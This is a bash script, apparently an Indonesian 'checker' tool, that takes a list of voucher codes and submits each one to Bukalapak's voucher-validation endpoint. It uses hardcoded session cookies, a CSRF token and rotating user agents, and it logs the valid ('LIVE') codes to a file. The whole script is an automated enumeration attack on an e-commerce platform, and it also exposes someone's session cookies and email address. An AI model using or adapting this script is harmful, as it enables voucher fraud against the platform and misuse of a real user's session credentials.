#!/bin/bash
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
header(){
printf "
         ------------------------------------
               Voucher Bukalapak Checker
         ------------------------------------
"
}
scanskrng(){ #function
    ua=$(cat ua.txt | sort -R | head -1)
    cekvalid=$(curl 'https://www.bukalapak.com/payment/purchases/check_voucher.json' -H 'User-Agent: '"${ua}"'' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://www.bukalapak.com/payment/purchases/new?product_id=457482232&product_sku_id=388102198&seller_ids=%5B13982887%5D' -H 'X-NewRelic-ID: VQcDWF9ADgIJVVBQ' -H 'X-CSRF-Token: ZO0ylIuYUkFz/ojbuEi3mNVw2sIpkNxZWJGc4tyzoUzV+9tAfEn6usBj/FDKVQQWeprZ+E/M9cB+Biu6XRLO5w==' -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: identity=8095446cf591eba747f21277e3c0872e; browser_id=7aff08a3c83c8a01b08eed86f8d542cf; _vwo_uuid_v2=D58DC33EEF80F00F3F471208FE29CCE54|c5caf23d495a3043bbab71e51dc0ce6e; _ga=GA1.2.464857469.1537712086; _gcl_au=1.1.1535333380.1537712089; insdrSV=82; scs=%7B%22t%22%3A1%7D; ins-mig-done=1; spUID=15377120918158365080735.4b146985; insUserData=%7B%22email%22%3A%22rootasuna%40gmail.com%22%7D; G_ENABLED_IDPS=google; _gid=GA1.2.1302656404.1538656708; __auc=2736815e1663f16255ee7062fc0; session_id=630137e49dce37f066625beb86fb1e69; lskjfewjrh34ghj23brjh234=dnU1Tlo3SCs5T0xTU2ZqcUZLR1MxMzlDWkVYRndRTkpBWkNOaVZmcmdVRzJyZ20vOS92Vk0zRjYzSmZGT2taV0U5UXFtWXZRSXk5QXVqU2IwS2ljc2t1L29XcXVSblkvNlU1bGVYOXM0RURrRGF0UENqdVR5TVozaERtNlBPQkgxU05GcXRuM2NQbEttTjR3QU5IN1FudzdCUW96VnN5cmlyRnN3RmtoYnRNNllGdWR3cGxoVGdub1AxaHFkSks0LS13VkUzV2FvUzFvN2VGRE12YytVM1FBPT0%3D--bc88df335889706d98c71a4da061423307745396; ins-gaSSId=bd925853-d6f4-34bf-4405-0a3bde11b9fb_1538925055; keyword_parent_id=; keyword_correlation_id=njcjkl4dg; total-cart-amount=424200; current-currency=IDR; mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%22rvf5t%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; _td=c779a38e-2da5-44d8-ca93-dfd63b8eea10; request_method=POST' -H 'Connection: keep-alive' --data '{"payment_invoice":{"transactions":[{"address":{"province":"","city":""},"amount":424200,"courier_cost":0,"insurance_cost":0,"agent_commission_amount":0,"courier":null,"seller_id":13982887,"retarget_discount_amount":0,"cart_item_ids":[2758749127]}],"payment_method":null,"voucher_amount":0},"payment_details":{"virtual_account_type":""},"voucher_code":"'$1'"}' --compressed -s);
    cek=$(echo $cekvalid | grep -Po '(?<=message":)[^}]*' | sed 's/\[\"//g' | sed 's/\"\]//g')
    if [[ $cek =~ "Silakan konfirmasi email akun Bukalapak Anda untuk menggunakan voucher ini" ]]; then
        printf "${GREEN}[LIVE] $1 [MatapandaxSGB]\n";
        echo "[LIVE] $1" >> live.txt
        printf "${NORMAL}"
    else
        printf "${RED}[DIE] $1 [MatapandaxSGB]\n";
        printf "${NORMAL}"
    fi
}
header
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> voucher"
echo -n "Masukan File List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
    x=$(gawk -F: '{ print $1 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
    emailna="${emailgblg[$i]}"
    kontol="${passwordna[$i]}"
        scanskrng $emailna
done

